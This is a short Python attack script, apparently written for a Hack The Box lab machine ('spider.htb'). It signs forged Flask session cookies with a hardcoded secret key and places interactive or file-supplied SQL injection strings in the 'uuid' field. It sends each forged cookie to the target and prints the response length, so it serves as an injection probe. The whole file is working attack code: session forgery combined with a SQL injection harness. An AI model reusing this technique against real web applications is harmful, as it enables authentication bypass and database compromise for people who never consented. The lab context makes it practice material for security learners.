import requests
import re
import time
import html
from flask_unsign import session

def flaskSignToken(inj):
    plainToken = dict()
    plainToken["uuid"] = inj
    # print(plainToken)
    token = session.sign(plainToken, "Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942")
    # print(plainToken["uuid"], "->\t",
    #  token
    # )
    return token

def testToken(token):
    burp0_url = "http://spider.htb:80/main"
    burp0_cookies = {"session": token}
    burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Referer": "http://spider.htb/", "Upgrade-Insecure-Requests": "1"}
    r = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
    print("[resp len]\t",len(r.text))
    timer = r.elapsed.total_seconds()
    # print("[resp time]\t",timer)

def main():
    while True:
        inj = input(">_")
    # with open("sqli.txt") as f:
    #     for line in f:
        time.sleep(0.5)
        # inj = line.strip()
        token = flaskSignToken(inj)
        testToken(token)

main()
